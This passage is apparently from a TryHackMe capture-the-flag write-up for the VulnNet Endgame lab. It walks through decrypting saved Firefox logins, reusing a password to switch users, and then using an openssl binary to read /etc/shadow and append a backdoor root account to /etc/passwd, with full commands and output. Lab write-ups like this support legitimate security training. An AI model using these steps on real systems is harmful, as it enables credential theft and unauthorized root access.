Accroding to one of the [Mozilla FireFox support questions](https://support.mozilla.org/en-US/questions/1352064), **the `logins.json` holds the encrypted login credentials.**

To decrypt it, I'll:

- Clone [Firefox Decrypt](https://github.com/unode/firefox_decrypt) repository from GitHub:

```
┌──(root🌸siunam)-[/opt]
└─# git clone https://github.com/unode/firefox_decrypt.git
```

- Decrypt the `login.json` via `firefox_decrypt.py`:

```
┌──(root🌸siunam)-[~/…/home/system/.mozilla/firefox]
└─# python3 /opt/firefox_decrypt/firefox_decrypt.py /root/ctf/thm/ctf/Vulnnet-Endgame/home/system/.mozilla/firefox/2fjnrwth.default-release 
2022-09-13 00:56:23,056 - WARNING - profile.ini not found in /root/ctf/thm/ctf/Vulnnet-Endgame/home/system/.mozilla/firefox/2fjnrwth.default-release
2022-09-13 00:56:23,057 - WARNING - Continuing and assuming '/root/ctf/thm/ctf/Vulnnet-Endgame/home/system/.mozilla/firefox/2fjnrwth.default-release' is a profile location

Website:   https://tryhackme.com
Username: 'chris_w@vulnnet.thm'
Password: '{Redacted}'
```

Boom!! We found a credentials. Now, I assume that the `system` user on the target machine is **using the same password**.

Let's **Switch User** to `system`:

```
www-data@vulnnet-endgame:/tmp$ su system
Password: 
system@vulnnet-endgame:/tmp$ whoami;hostname;id;ip a
system
vulnnet-endgame
uid=1000(system) gid=1000(system) groups=1000(system)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:58:40:e8:92:69 brd ff:ff:ff:ff:ff:ff
    inet 10.10.214.82/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::58:40ff:fee8:9269/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `system`!

**user.txt:**
```
system@vulnnet-endgame:~$ cat /home/system/user.txt 
THM{Redacted}
```

## system to root

During the enumeration process in `www-data`, I also found that the `/home/system/Utils` kinda weird:

```
system@vulnnet-endgame:~$ ls -lah
[...]
dr-xr-x---  2 system system 4.0K Jun 14 13:24 Utils
```

Let's check that out:

```
system@vulnnet-endgame:~/Utils$ ls -lah
total 1.1M
dr-xr-x---  2 system system 4.0K Jun 14 13:24 .
drwxr-xr-x 18 system system 4.0K Jun 15 17:12 ..
-r-xr-x---  1 system system 707K Jun 14 13:23 openssl
-r-xr-x---  1 system system 175K Jun 14 13:24 unzip
-r-xr-x---  1 system system 212K Jun 14 13:23 zip
```

In here, we see **3 binaries**.

According to [GTFOBins](https://gtfobins.github.io/gtfobins/openssl/), **`openssl` could be abused to escalate our privilege to root!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a23.png)

**Let's test reading `/etc/shadow`:**
```
system@vulnnet-endgame:~/Utils$ ./openssl enc -in /etc/shadow
root:$6$cB/S/D17${Redacted}.uZ38MHH4rQxamADbI/:19157:0:99999:7:::
daemon:*:18885:0:99999:7:::
bin:*:18885:0:99999:7:::
sys:*:18885:0:99999:7:::
sync:*:18885:0:99999:7:::
games:*:18885:0:99999:7:::
man:*:18885:0:99999:7:::
[...]

system@vulnnet-endgame:~/Utils$ ls -lah /etc/shadow
-rw-r----- 1 root shadow 1.5K Jun 14 16:48 /etc/shadow
```

**Wait, we can read `/etc/shadow`??**

Hmm... If we can read `/etc/shadow`, then we might also can write things to `/etc/passwd`!

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/VulnNet-Endgame/images/a24.png)

To gain root privilege, we can:

- Generate a password hash for `passwd`:

```
┌──(root🌸siunam)-[~/ctf/thm/ctf/Vulnnet-Endgame]
└─# openssl passwd pwnedpassword
$1$.YB66nk1$8Gsn7z0GJMm8eH8D95k0K1
```

- Copy `/etc/passwd`, add a new user with root privilege:

```
system@vulnnet-endgame:~/Utils$ cp /etc/passwd /tmp/passwd.bak

system@vulnnet-endgame:~/Utils$ echo "pwned:\$1\$.YB66nk1\$8Gsn7z0GJMm8eH8D95k0K1:0:0:root:/root:/bin/bash" >> /tmp/passwd.bak
```

> Note: Remember to escape special characters in `echo` via `\`, like `$`.

- Overwrite the original `/etc/passwd` via `/home/system/Utils/openssl`:

```
system@vulnnet-endgame:~/Utils$ cat /tmp/passwd.bak | ./openssl enc -out /etc/passwd

system@vulnnet-endgame:~/Utils$ cat /etc/passwd
[...]
pwned:$1$.YB66nk1$8Gsn7z0GJMm8eH8D95k0K1:0:0:root:/root:/bin/bash
```

We successfully overwritten the `/etc/passwd`!!

Now let's **Switch User** to our newly created user!

```
system@vulnnet-endgame:~/Utils$ su pwned
Password: 
root@vulnnet-endgame:/home/system/Utils# whoami;hostname;id;ip a
root
vulnnet-endgame
uid=0(root) gid=0(root) groups=0(root)
[...]
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:58:40:e8:92:69 brd ff:ff:ff:ff:ff:ff
    inet 10.10.214.82/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2804sec preferred_lft 2804sec
    inet6 fe80::58:40ff:fee8:9269/64 scope link 
       valid_lft forever preferred_lft forever
```

And I'm root! :D

# Rooted

**root.txt:**
```
root@vulnnet-endgame:/home/system/Utils# cat /root/thm-flag/root.txt 
THM{Redacted}
```

# Conclusion

What we've learned:

1. Subdomain Enumeration
2. Directory Enumeration
3. API Enumeration
4. SQL Injection
5. Hash Cracking
6. Browser Enumeration (FireFox)
7. Privilege Escalation via Decrypting FireFox's `login.json`
8. Privilege Escalation via Modifying `/etc/passwd` with `openssl`